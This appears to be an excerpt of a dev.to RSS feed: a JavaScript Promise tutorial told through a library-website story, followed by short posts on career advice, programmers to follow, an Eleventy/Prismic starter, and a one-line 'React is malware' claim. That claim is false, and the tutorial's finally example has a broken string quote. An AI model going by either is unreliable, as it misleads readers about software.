Else if it found the result in the library databases it was either available or not. &lt;/p&gt;

&lt;p&gt;This speed the search up because the ordered databases were smaller than the other group. So if it found a match result among them it terminated the searching quicker.&lt;/p&gt;

&lt;p&gt;But two weeks after the new bot's implementation most of the orders had to be rejected. She had had a regular delivery count of 9 to 10 books per day. Now, this number had fallen to as low as 3.&lt;/p&gt;

&lt;p&gt;Some days none at all.&lt;/p&gt;

&lt;p&gt;Many of the borrowed books remained unreturned for a long time. Their owners didn't even order new ones.&lt;/p&gt;

&lt;p&gt;And then she heard rumors. One of her best friends had tested positive for Covid-19. The infection statistics were surging in her town. She called some of her customers to ask why they weren't trying to return their books.&lt;/p&gt;

&lt;p&gt;Her suspicions proved right. Covid-19 had hit many of her customers. But some other ones were actually bothered with the site's functionality. They hated waiting a long time for no results.&lt;/p&gt;

&lt;p&gt;She tried to talk them back into using the library's website. She even promised that she will fix the issues. But &lt;strong&gt;promises&lt;/strong&gt; weren't convincing anymore. &lt;/p&gt;

&lt;p&gt;One night she called her cousin. Tears in her eyes. "I failed.", she said. The confession feeling bitter. "I failed badly."&lt;/p&gt;


&lt;h2&gt;
  &lt;a href="#static-methods-raw-promiseany-endraw-amp-raw-promiserace-endraw-"&gt;
  &lt;/a&gt;
  🏃🏻‍♂️ Static Methods: &lt;code&gt;Promise.any&lt;/code&gt; &amp;amp; &lt;code&gt;Promise.race&lt;/code&gt;.&lt;a&gt;&lt;/a&gt;
&lt;/h2&gt;

&lt;p&gt;&lt;code&gt;Promise.any&lt;/code&gt; accepts an array of promises. And resolves as soon as &lt;strong&gt;any&lt;/strong&gt; of them &lt;code&gt;fulfills&lt;/code&gt;.&lt;/p&gt;

&lt;p&gt;The library's users chose a book and ordered it and waited to see if it was available. If not, they would go for the next one. But this process took a long time. They had to wait for each order's message to arrive before they could decide anything.&lt;/p&gt;

&lt;p&gt;And when the system became unresponsive it wasted the users' precious time by days and weeks.&lt;/p&gt;

&lt;p&gt;What if they could find a way to order many books together and get the first book that was available? Of course, it was impossible with the library website's architecture. Sarah wouldn't have allowed this. This could ruin all her plans.&lt;/p&gt;

&lt;p&gt;But this is not the case with JavaScript. If you are waiting for the first promise that resolves, use &lt;code&gt;Promise.any&lt;/code&gt;. It works the same way as the hack the library users wished for.&lt;/p&gt;

&lt;p&gt;An implementation of &lt;code&gt;Promise.any&lt;/code&gt;:&lt;br&gt;
&lt;/p&gt;

&lt;div class="highlight js-code-highlight"&gt;
&lt;pre class="highlight javascript"&gt;&lt;code&gt;&lt;span class="nb"&gt;Promise&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="nx"&gt;any&lt;/span&gt;&lt;span class="p"&gt;([&lt;/span&gt;&lt;span class="nx"&gt;order1&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="nx"&gt;order2&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="nx"&gt;order3&lt;/span&gt;&lt;span class="p"&gt;])&lt;/span&gt;
  &lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="nx"&gt;then&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="nx"&gt;order&lt;/span&gt; &lt;span class="o"&gt;=&amp;gt;&lt;/span&gt; &lt;span class="nx"&gt;console&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="nx"&gt;log&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="dl"&gt;"&lt;/span&gt;&lt;span class="s2"&gt;this order resolved first&lt;/span&gt;&lt;span class="dl"&gt;"&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="nx"&gt;order&lt;/span&gt;&lt;span class="p"&gt;))&lt;/span&gt;
  &lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="k"&gt;catch&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="nx"&gt;error&lt;/span&gt; &lt;span class="o"&gt;=&amp;gt;&lt;/span&gt; &lt;span class="nx"&gt;console&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="nx"&gt;log&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="nx"&gt;error&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
    &lt;span class="c1"&gt;// expected output: "AggregateError: No Promise in Promise.any was resolved"&lt;/span&gt;
  &lt;span class="p"&gt;)&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;

&lt;/div&gt;



&lt;p&gt;As soon as any of the promises resolves, the &lt;code&gt;Promise Object&lt;/code&gt; calls the callback passed to &lt;code&gt;then&lt;/code&gt;. If all reject, it enters the &lt;code&gt;catch&lt;/code&gt; territory.&lt;/p&gt;

&lt;p&gt;Then there is &lt;code&gt;Promise.race&lt;/code&gt;. It resolves with the first &lt;code&gt;Promise&lt;/code&gt; that &lt;code&gt;settles&lt;/code&gt;. In case you've already forgotten, a &lt;code&gt;Settled Promise&lt;/code&gt; is either &lt;code&gt;fulfilled&lt;/code&gt; or &lt;code&gt;rejected&lt;/code&gt;.&lt;/p&gt;

&lt;p&gt;Now, why should someone need to implement that? It's actually difficult to name a good use case for &lt;code&gt;Promise.race&lt;/code&gt;. But still, there are few times when it could be of help.&lt;/p&gt;

&lt;p&gt;Let's think about the bot that Sarah's cousin had developed. It exited the processes as soon as any of them returned anything. You might say that the bot's actual action is like what &lt;code&gt;Promise.any&lt;/code&gt; does. It returns as one of them &lt;code&gt;fulfills&lt;/code&gt;.&lt;/p&gt;

&lt;p&gt;Then it can be a bad example. But let's say that the &lt;code&gt;Promise&lt;/code&gt; which he used to search the &lt;code&gt;ordered books&lt;/code&gt; didn't fulfill when it matched a book. Let's say Sarah's cousin was smarter and played a trick on it.&lt;/p&gt;

&lt;p&gt;If the search in the ordered books matched a result then its &lt;code&gt;Promise&lt;/code&gt; rejected. Otherwise, if it had searched the entire databases and found none it resolved. But, if the search process related to the library books found a match and it was available then it resolved. Otherwise, the &lt;code&gt;Promise&lt;/code&gt; rejected.&lt;/p&gt;

&lt;p&gt;So here we have got a bright point. The rejection of one of the promises means the resolving of the other one. And vice versa.&lt;/p&gt;

&lt;p&gt;Now, &lt;code&gt;Promise.race&lt;/code&gt; can help us in reducing the time we need to wait for a useful response.&lt;/p&gt;

&lt;p&gt;Let's have a quick look:&lt;br&gt;
&lt;/p&gt;

&lt;div class="highlight js-code-highlight"&gt;
&lt;pre class="highlight javascript"&gt;&lt;code&gt;&lt;span class="nb"&gt;Promise&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="nx"&gt;race&lt;/span&gt;&lt;span class="p"&gt;([&lt;/span&gt;&lt;span class="nx"&gt;searchLibraryBooks&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="nx"&gt;searchOrderedBooks&lt;/span&gt;&lt;span class="p"&gt;])&lt;/span&gt;
  &lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="nx"&gt;then&lt;/span&gt;&lt;span class="p"&gt;((&lt;/span&gt;&lt;span class="nx"&gt;book&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt; &lt;span class="o"&gt;=&amp;gt;&lt;/span&gt; &lt;span class="nx"&gt;console&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="nx"&gt;log&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="dl"&gt;"&lt;/span&gt;&lt;span class="s2"&gt;Book is available.&lt;/span&gt;&lt;span class="dl"&gt;"&lt;/span&gt;&lt;span class="p"&gt;))&lt;/span&gt;
  &lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="k"&gt;catch&lt;/span&gt;&lt;span class="p"&gt;((&lt;/span&gt;&lt;span class="nx"&gt;reason&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt; &lt;span class="o"&gt;=&amp;gt;&lt;/span&gt; &lt;span class="nx"&gt;console&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="nx"&gt;log&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="dl"&gt;"&lt;/span&gt;&lt;span class="s2"&gt;Book is not available, because &lt;/span&gt;&lt;span class="dl"&gt;"&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="nx"&gt;reason&lt;/span&gt;&lt;span class="p"&gt;))&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;

&lt;/div&gt;



&lt;p&gt;The library books have an alphabetical sorting. The ordered ones are sorted by their order date. So it's possible that the search in the whole library books could make a quicker match sometimes.&lt;/p&gt;




&lt;p&gt;It didn't take long before Sarah received a phone call from his cousin. He sounded anxious. And when she asked him what was wrong, he replied: "The bot had a bug, Sarah. There are always several versions of a book in the library. This means that if someone borrows one of its versions the book could still be available. I hadn't thought about this in my code. If one version of the book was ordered then I tagged it as unavailable. I'm sorry Sarah."&lt;/p&gt;

&lt;p&gt;Sarah was in shock for several seconds. How didn't this even cross her own mind?&lt;br&gt;
"Can you fix it?", she asked.&lt;br&gt;
"Well I'll do my best.", the other replied.&lt;br&gt;
"Then you better do it.", she couldn't control how loud her voice got. "And do it as soon as possible!"&lt;/p&gt;

&lt;p&gt;It took another day for them to fix the issue. She sent Emails to her clients. Informing that they have fixed the issue. And the users could start using the website immediately.&lt;/p&gt;


&lt;h2&gt;
  &lt;a href="#promise-callbacks-raw-finally-endraw-"&gt;
  &lt;/a&gt;
  🔚 Promise Callbacks: &lt;code&gt;finally&lt;/code&gt;.&lt;a&gt;&lt;/a&gt;
&lt;/h2&gt;

&lt;p&gt;We learned about &lt;code&gt;then&lt;/code&gt; and &lt;code&gt;catch&lt;/code&gt;. But the &lt;code&gt;Promise Object&lt;/code&gt; also provides us with another method. It doesn't care if the &lt;code&gt;Promise&lt;/code&gt; fulfills or not. It only cares that it &lt;code&gt;settles&lt;/code&gt;. And any &lt;code&gt;then&lt;/code&gt; and &lt;code&gt;catch&lt;/code&gt; calls have already been delegated. Then it runs and does what you ask it for.&lt;/p&gt;

&lt;p&gt;An example:&lt;br&gt;
&lt;/p&gt;

&lt;div class="highlight js-code-highlight"&gt;
&lt;pre class="highlight javascript"&gt;&lt;code&gt;&lt;span class="kd"&gt;const&lt;/span&gt; &lt;span class="nx"&gt;websiteDelivery&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="nb"&gt;Promise&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="nx"&gt;resolve&lt;/span&gt;&lt;span class="p"&gt;({&lt;/span&gt;&lt;span class="na"&gt;useServerDatabase&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="kc"&gt;false&lt;/span&gt;&lt;span class="p"&gt;})&lt;/span&gt;
&lt;span class="nx"&gt;websiteDelivery&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="nx"&gt;then&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="nx"&gt;condition&lt;/span&gt; &lt;span class="o"&gt;=&amp;gt;&lt;/span&gt; &lt;span class="p"&gt;{&lt;/span&gt;
    &lt;span class="k"&gt;if&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="o"&gt;!&lt;/span&gt;&lt;span class="nx"&gt;condition&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="nx"&gt;useServerDatabase&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt; &lt;span class="nx"&gt;console&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="nx"&gt;log&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="dl"&gt;'&lt;/span&gt;&lt;span class="s1"&gt;Use Access database&lt;/span&gt;&lt;span class="dl"&gt;'&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
    &lt;span class="k"&gt;else&lt;/span&gt; &lt;span class="k"&gt;throw&lt;/span&gt; &lt;span class="k"&gt;new&lt;/span&gt; &lt;span class="nb"&gt;Error&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="dl"&gt;'&lt;/span&gt;&lt;span class="s1"&gt;Data isn&lt;/span&gt;&lt;span class="dl"&gt;'&lt;/span&gt;&lt;span class="nx"&gt;t&lt;/span&gt; &lt;span class="nx"&gt;still&lt;/span&gt; &lt;span class="nx"&gt;moved&lt;/span&gt; &lt;span class="nx"&gt;to&lt;/span&gt; &lt;span class="nx"&gt;the&lt;/span&gt; &lt;span class="nx"&gt;server&lt;/span&gt;&lt;span class="dl"&gt;'&lt;/span&gt;&lt;span class="s1"&gt;)
  )
  .catch(error =&amp;gt; console.log("Error in starting delivery website", error))
  .finally(_ =&amp;gt; console.log("No matter if you lost 100 times. Try for the 101st time!")
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;

&lt;/div&gt;



&lt;p&gt;The &lt;code&gt;Promise Object&lt;/code&gt; calls the function you passed to the &lt;code&gt;finally&lt;/code&gt; method in any condition. After the &lt;code&gt;Promise&lt;/code&gt; settles.&lt;/p&gt;




&lt;p&gt;"The devil is always in the details." This was what Mrs. Perkins told Sarah after she heard her story. She went on: "You saw the big picture. You wanted to start a movement and to modernize our town's library. But you forgot the details my dear. You told yourself that you can handle the database work. But this was something you had to leave to the programmer. After you've finally restored the library's daily life, I hope you've learned something. And I hope that this damned pandemic ends very soon."&lt;/p&gt;

&lt;p&gt;Sarah hoped too. And she smiled.&lt;/p&gt;




&lt;p&gt;It was a long read. And a longer one to write. I think it was worth the time.&lt;/p&gt;

&lt;p&gt;The hardest part was about &lt;code&gt;Promise.race&lt;/code&gt;. I could hardly find a good use case for it. And I hope the idea I came up with could help you make a picture of it.&lt;/p&gt;

&lt;p&gt;Do you think there are better use cases for any of these methods? Or do you think I have gotten something wrong? &lt;/p&gt;

&lt;p&gt;Please let me know in the comments. Writing this article helped me a lot in understanding the concepts myself. Your comments can help me and the others further too.&lt;/p&gt;

&lt;p&gt;Thanks for the reading.&lt;/p&gt;

&lt;p&gt;The cover image is by &lt;a href="http://www.epictop10.com/"&gt;Epic Top 10 Site&lt;/a&gt;.&lt;/p&gt;

</description>
      <category>javascript</category>
      <category>frontend</category>
      <category>webdev</category>
      <category>tutorial</category>
    </item>
    <item>
      <title>Don't Trust Facebook</title>
      <author>Jeff Meyerson</author>
      <pubDate>Sat, 07 Aug 2021 16:25:11 +0000</pubDate>
      <link>https://dev.to/the_prion/don-t-trust-facebook-2pe8</link>
      <guid>https://dev.to/the_prion/don-t-trust-facebook-2pe8</guid>
      <description>&lt;p&gt;React is malware.&lt;/p&gt;

&lt;p&gt;Across every interface, it gives Facebook direct access to everything you see and do.&lt;/p&gt;

&lt;p&gt;&lt;iframe width="710" height="399" src="https://www.youtube.com/embed/sJxqq0NHzK0"&gt;
&lt;/iframe&gt;
&lt;/p&gt;

</description>
      <category>facebook</category>
      <category>power</category>
      <category>abuse</category>
      <category>react</category>
    </item>
    <item>
      <title>What advice would you give to High Schooler thinking of software developer career?</title>
      <author>Clean Code Studio</author>
      <pubDate>Sat, 07 Aug 2021 16:18:44 +0000</pubDate>
      <link>https://dev.to/cleancodestudio/what-advice-would-you-give-to-high-schooler-thinking-of-software-developer-career-3k13</link>
      <guid>https://dev.to/cleancodestudio/what-advice-would-you-give-to-high-schooler-thinking-of-software-developer-career-3k13</guid>
      <description>&lt;div class="ltag__user ltag__user__id__386677"&gt;
  
    .ltag__user__id__386677 .follow-action-button {
      background-color: #339d15 !important;
      color: #ffffff !important;
      border-color: #339d15 !important;
    }
  
    &lt;a href="/cleancodestudio" class="ltag__user__link profile-image-link"&gt;
      &lt;div class="ltag__user__pic"&gt;
        &lt;img src="https://res.cloudinary.com/practicaldev/image/fetch/s--iaD-SiIM--/c_limit%2Cf_auto%2Cfl_progressive%2Cq_auto%2Cw_880/https://res.cloudinary.com/practicaldev/image/fetch/s--uL9Viyw2--/c_fill%2Cf_auto%2Cfl_progressive%2Ch_150%2Cq_auto%2Cw_150/https://dev-to-uploads.s3.amazonaws.com/uploads/user/profile_image/386677/50ab5359-8342-4fc0-961a-04bb95957fa1.jpg" alt="cleancodestudio image"&gt;
      &lt;/div&gt;
    &lt;/a&gt;
  &lt;div class="ltag__user__content"&gt;
    &lt;h2&gt;
&lt;a class="ltag__user__link" href="/cleancodestudio"&gt;Clean Code Studio&lt;/a&gt;Follow
&lt;/h2&gt;
    &lt;div class="ltag__user__summary"&gt;
      &lt;a class="ltag__user__link" href="/cleancodestudio"&gt;Clean Code Clean Life ~ Simplify&lt;/a&gt;
    &lt;/div&gt;
  &lt;/div&gt;
&lt;/div&gt;


&lt;blockquote&gt;
&lt;p&gt;&lt;em&gt;"If a junior in high school were asking for your advice, what&lt;/em&gt;&lt;br&gt;
&lt;em&gt;would you tell them? What tips would you have for going into&lt;/em&gt;&lt;br&gt;
&lt;em&gt;'computer science'?&lt;/em&gt;"&lt;/p&gt;
&lt;/blockquote&gt;

&lt;p&gt;(Please comment your tips - asking for real high school kid who stopped me to personally ask for advice)&lt;/p&gt;




&lt;p&gt;&lt;em&gt;"Last night the next door neighbors kid stopped me in the drive way..."&lt;/em&gt;&lt;/p&gt;

&lt;p&gt;I was pulling into my parent's drive way - usually swing by my child hood home a couple times month. &lt;/p&gt;

&lt;p&gt;Last night when I pulled into the drive way I heard &lt;/p&gt;




&lt;p&gt;&lt;em&gt;"Hey!!! Is that Zak?"&lt;/em&gt;&lt;/p&gt;




&lt;p&gt;It was, I'm Zak, I'm a software engineer - and I have been for over half a decade. I never went to college and make a great living. My child hood neighbors kid who is about a decade younger than me knows this. &lt;/p&gt;

&lt;p&gt;He wanted advice about going into the computer science field. &lt;/p&gt;

&lt;p&gt;Before I had time to process what I was saying I spat out, "Well, I don't recommend college." &lt;/p&gt;

&lt;p&gt;Looking back to last night, I'm not confident that was the best initial piece of advice to go with - but hey, I wasn't prepared. &lt;/p&gt;

&lt;p&gt;I decided to take a pause, asked for his number and email, and told him that I'd think on it and get get him some solid tips by mid next week. &lt;/p&gt;




&lt;p&gt;If a junior in high school were asking for your advice, what would you tell them? What tips would you have?&lt;/p&gt;

&lt;p&gt;This kid is smart and as far as I can tell has the makings and characteristics to be a software engineer...I just want to make sure I'm providing the best, most non-bias advice I'm able to.&lt;/p&gt;

&lt;p&gt;With that, any tips and advice you can offer up - I'll make sure to pass along to Stevie.&lt;/p&gt;

</description>
      <category>programming</category>
      <category>discuss</category>
      <category>help</category>
      <category>career</category>
    </item>
    <item>
      <title>Top 10 programmers on twitter to follow in 2021 (personal suggestion)</title>
      <author>Muhammad Ali (Nerdjfpb)</author>
      <pubDate>Sat, 07 Aug 2021 16:16:22 +0000</pubDate>
      <link>https://dev.to/nerdjfpb/top-10-programmers-on-twitter-to-follow-in-2021-personal-suggestion-1h58</link>
      <guid>https://dev.to/nerdjfpb/top-10-programmers-on-twitter-to-follow-in-2021-personal-suggestion-1h58</guid>
      <description>&lt;p&gt;Twitter has around 206 million daily active users worldwide &lt;a href="%5Bhttps://www.statista.com/statistics/242606/number-of-active-twitter-users-in-selected-countries/%5D(https://www.statista.com/statistics/242606/number-of-active-twitter-users-in-selected-countries/)"&gt;Source&lt;/a&gt;. It's an amazing platform for start a conversation with anyone. Lots of people use it for following celebrities, friends &amp;amp; family, etc. But I use Twitter for my tech knowledge. There are enough company/startup/product profiles on Twitter, I followed them so I keep up with them. I can see when they are releasing new features, how they are releasing them. I followed them based on my tech stack, so you can do this too. But today I'm going to share my list of top 10 programmers anyone should follow (for content-wise). Also if you are interested to connect with me, drop a dm in - &lt;a href="https://twitter.com/nerdjfpb"&gt;https://twitter.com/nerdjfpb&lt;/a&gt;&lt;/p&gt;

&lt;h2&gt;
  &lt;a href="#oliver-jumpertz"&gt;
  &lt;/a&gt;
  &lt;a href="%5Bhttps://twitter.com/oliverjumpertz/%5D(https://twitter.com/oliverjumpertz/)"&gt;Oliver Jumpertz&lt;/a&gt;
&lt;/h2&gt;

&lt;p&gt;Recently I discovered him. He has around 21 Years Of Programming Experience and his content is amazing. He writes about interview topics recently and I love them. He also runs a newsletter. Following him will make your feed content-rich for sure.&lt;/p&gt;

&lt;h2&gt;
  &lt;a href="#jack-forge"&gt;
  &lt;/a&gt;
  &lt;a href="%5Bhttps://twitter.com/TheJackForge%5D(https://twitter.com/TheJackForge)"&gt;Jack Forge&lt;/a&gt;
&lt;/h2&gt;

&lt;p&gt;When you got bored with all the programming posts. Jack comes to the rescue. His posts are funny, his post can bring a smile to your face anytime. I found he is writing a lot of entertaining posts about tech, which is pretty rare in the tech space. Also, he runs a lot of giveaways. Follow him, maybe you'll get one soon!&lt;/p&gt;

&lt;h2&gt;
  &lt;a href="#danny-thompson"&gt;
  &lt;/a&gt;
  &lt;a href="%5Bhttps://twitter.com/DThompsonDev%5D(https://twitter.com/DThompsonDev)"&gt;Danny Thompson&lt;/a&gt;
&lt;/h2&gt;

&lt;p&gt;An amazing person, a software engineer in Google. Put awesomeness content on Twitter, also runs a discord community. He also helps people to get a job a lot. He is too humble &amp;amp; kind. Worth following. One follow can return with a job someday.&lt;/p&gt;

&lt;h2&gt;
  &lt;a href="#emma-bostian"&gt;
  &lt;/a&gt;
  &lt;a href="%5Bhttps://twitter.com/EmmaBostian%5D(https://twitter.com/EmmaBostian)"&gt;Emma Bostian&lt;/a&gt;
&lt;/h2&gt;

&lt;p&gt;I'm following her for a long time now. She is an amazing content creator, watched her free talks on youtube. Did a course of frontend mentor about design systems, also read her blogs. She is currently working in Spotify (don't ask her to change something in Spotify). If you follow here you'll find some amazing tweets in your feed every week.&lt;/p&gt;

&lt;h2&gt;
  &lt;a href="#dan"&gt;
  &lt;/a&gt;
  &lt;a href="%5Bhttps://twitter.com/dan_abramov%5D(https://twitter.com/dan_abramov)"&gt;Dan&lt;/a&gt;
&lt;/h2&gt;

&lt;p&gt;Dan is one of the popular guys in the tech industry, currently, he has 300k followers. So you can understand he is popular. I know him when he was around 60/80k I guess. I was following the people who work in react core team and found out he also made redux. Also, he suggests not to use redux. So if you want to get some honest reviews about the programming library maybe you can follow him. Although he posts some other programming content too. His recent justjavascript book is awesome, I've read that as an email course and it opened a new world for me. Mental models were so cool. Worth a follow anytime.&lt;/p&gt;

&lt;h2&gt;
  &lt;a href="#florin-pop"&gt;
  &lt;/a&gt;
  &lt;a href="%5Bhttps://twitter.com/florinpop1705%5D(https://twitter.com/florinpop1705)"&gt;Florin Pop&lt;/a&gt;
&lt;/h2&gt;

&lt;p&gt;Youtube and amazing communicator on Twitter. He is an amazing developer who can help you with your javascript. Check this youtube channel too.&lt;/p&gt;

&lt;h2&gt;
  &lt;a href="#csaba-kissi"&gt;
  &lt;/a&gt;
  &lt;a href="%5Bhttps://twitter.com/csaba_kissi%5D(https://twitter.com/csaba_kissi)"&gt;Csaba Kissi&lt;/a&gt;
&lt;/h2&gt;

&lt;p&gt;He posts about how he is building products and it's amazing to see. He posts some insight about different programming stuff plus he replies to almost any comment. He is an amazing guy to follow. Follow of learning about products.&lt;/p&gt;

&lt;h2&gt;
  &lt;a href="#pratham"&gt;
  &lt;/a&gt;
  &lt;a href="%5Bhttps://twitter.com/Prathkum%5D(https://twitter.com/Prathkum)"&gt;Pratham&lt;/a&gt;
&lt;/h2&gt;

&lt;p&gt;This guy is made by CSS. If you are learning CSS then his posts can be so useful to you. He also posts about javascript, building an audience on Twitter. Follow him to make your feed's content rich with CSS, javascript &amp;amp; Twitter follower building tips.&lt;/p&gt;

&lt;h2&gt;
  &lt;a href="#joe-previte"&gt;
  &lt;/a&gt;
  &lt;a href="%5Bhttps://twitter.com/jsjoeio%5D(https://twitter.com/jsjoeio)"&gt;Joe Previte&lt;/a&gt;
&lt;/h2&gt;

&lt;p&gt;He changes his name with time by the technology he is learning. It's super fun to watch. He also creates content, courses and currently building products. You can follow him for programming &amp;amp; indie hacking.&lt;/p&gt;

&lt;h2&gt;
  &lt;a href="#catalin-pit"&gt;
  &lt;/a&gt;
  &lt;a href="%5Bhttps://twitter.com/catalinmpit%5D(https://twitter.com/catalinmpit)"&gt;Catalin Pit&lt;/a&gt;
&lt;/h2&gt;

&lt;p&gt;I really like his writing, he is writing about Vue, Node.Js, AWS, JavaScript, Cloud Computing, and Software Development. I'll ask you to check more about him. I'll not give a spoiler about this.&lt;/p&gt;

&lt;p&gt;There are many other profiles you can follow, but for this year I think this is my personal list.&lt;/p&gt;

&lt;p&gt;Comment down your top 10 list.&lt;/p&gt;




&lt;p&gt;Originally it published on &lt;a href="https://blog.nerdjfpb.com/top-10-programmers-on-twitter-to-follow-in-2021/"&gt;nerdjfpbblog&lt;/a&gt;.&lt;/p&gt;

&lt;p&gt;I’ve started a programming community on discord. Click to join &lt;a href="https://discord.gg/uDj2JtH"&gt;Discord Channel&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;I've two free PDF for you&lt;/p&gt;

&lt;ul&gt;
&lt;li&gt;&lt;a href="https://blog.nerdjfpb.com/javascript-in-30-days-free-pdf/"&gt;Learn JavaScript in 30 Days&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="https://blog.nerdjfpb.com/node-js-in-30-days-free-pdf/"&gt;Node JS In 30 Days&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;

</description>
      <category>programming</category>
      <category>webdev</category>
      <category>codenewbie</category>
      <category>discuss</category>
    </item>
    <item>
      <title>Eleventy Soft UI - Powered by Prismic CMS</title>
      <author>Sm0ke</author>
      <pubDate>Sat, 07 Aug 2021 16:01:24 +0000</pubDate>
      <link>https://dev.to/sm0ke/eleventy-soft-ui-powered-by-prismic-cms-4eei</link>
      <guid>https://dev.to/sm0ke/eleventy-soft-ui-powered-by-prismic-cms-4eei</guid>
      <description>&lt;p&gt;Hello coders,&lt;/p&gt;

&lt;p&gt;This article presents an open-source starter built in &lt;strong&gt;Eleventy&lt;/strong&gt; and &lt;strong&gt;Prismic CMS&lt;/strong&gt; on top of a modern Bootstrap 5 design: &lt;a href="https://appseed.us/product/eleventy-soft-ui"&gt;Soft UI Design&lt;/a&gt;. The product can be used to code much faster presentation websites or personal blogs. For newcomers, &lt;strong&gt;Eleventy&lt;/strong&gt; is a lightweight static-site generator and &lt;strong&gt;Prismic CMS&lt;/strong&gt; provides a headless blog service.   &lt;/p&gt;

&lt;blockquote&gt;
&lt;p&gt;&lt;em&gt;Thanks for reading!&lt;/em&gt; - Content provided by &lt;strong&gt;&lt;a href="https://appseed.us/"&gt;App Generator&lt;/a&gt;&lt;/strong&gt;.&lt;/p&gt;
&lt;/blockquote&gt;




&lt;ul&gt;
&lt;li&gt;
&lt;a href="https://appseed.us/product/eleventy-soft-ui"&gt;Eleventy Soft UI&lt;/a&gt; - product page&lt;/li&gt;
&lt;li&gt;
&lt;a href="https://eleventy-soft-ui.appseed-srv1.com/"&gt;Eleventy Soft UI&lt;/a&gt; - LIVE Demo&lt;/li&gt;
&lt;li&gt;
&lt;a href="https://eleventy-soft-ui.appseed-srv1.com/blog/about/"&gt;Eleventy Soft UI _blog&lt;/a&gt; - Page pulled from Prismic&lt;/li&gt;
&lt;/ul&gt;




&lt;p&gt;&lt;a href="https://res.cloudinary.com/practicaldev/image/fetch/s--FDxhU2aK--/c_limit%2Cf_auto%2Cfl_progressive%2Cq_auto%2Cw_880/https://dev-to-uploads.s3.amazonaws.com/uploads/articles/guwdqi549lwqkvsydphc.png" class="article-body-image-wrapper"&gt;&lt;img src="https://res.cloudinary.com/practicaldev/image/fetch/s--FDxhU2aK--/c_limit%2Cf_auto%2Cfl_progressive%2Cq_auto%2Cw_880/https://dev-to-uploads.s3.amazonaws.com/uploads/articles/guwdqi549lwqkvsydphc.png" alt="Eleventy Soft UI - Open-source static site powered by 11ty, Prismic and AppSeed."&gt;&lt;/a&gt;&lt;/p&gt;




&lt;p&gt;To use the product a decent Nodejs version should be installed in the workstation and (optionally) a &lt;a href="https://prismic.io/"&gt;Prismic&lt;/a&gt; account (free tier available). &lt;/p&gt;

&lt;blockquote&gt;
&lt;p&gt;The problem that starter solves&lt;/p&gt;
&lt;/blockquote&gt;

&lt;p&gt;Static sites are great to code simple pages and presentation sites .. but for blogs developers should use a Markdown to Html translation to edit their content. Prismic help us with this part and empower the developer to edit and format the content visually. &lt;/p&gt;




&lt;blockquote&gt;
&lt;p&gt;How it works &lt;/p&gt;
&lt;/blockquote&gt;

&lt;ul&gt;
&lt;li&gt;&lt;p&gt;&lt;strong&gt;Step #1&lt;/strong&gt; - Add your content in Prismic CMS&lt;/p&gt;&lt;/li&gt;
&lt;li&gt;&lt;p&gt;&lt;strong&gt;Step #2&lt;/strong&gt; - Configure the starter to consume the Prismic Content&lt;/p&gt;&lt;/li&gt;
&lt;li&gt;&lt;p&gt;&lt;strong&gt;Step #3&lt;/strong&gt; - Install dependencies and start the project&lt;/p&gt;&lt;/li&gt;
&lt;li&gt;&lt;p&gt;&lt;strong&gt;Step #4&lt;/strong&gt; - Built for production &lt;/p&gt;&lt;/li&gt;
&lt;/ul&gt;




&lt;p&gt;Once all steps are completed, &lt;strong&gt;Soft UI 11ty&lt;/strong&gt; should be up and running in the browser will all Prismic articles pulled locally.&lt;/p&gt;




&lt;blockquote&gt;
&lt;p&gt;11ty Soft UI - Team Section&lt;/p&gt;
&lt;/blockquote&gt;

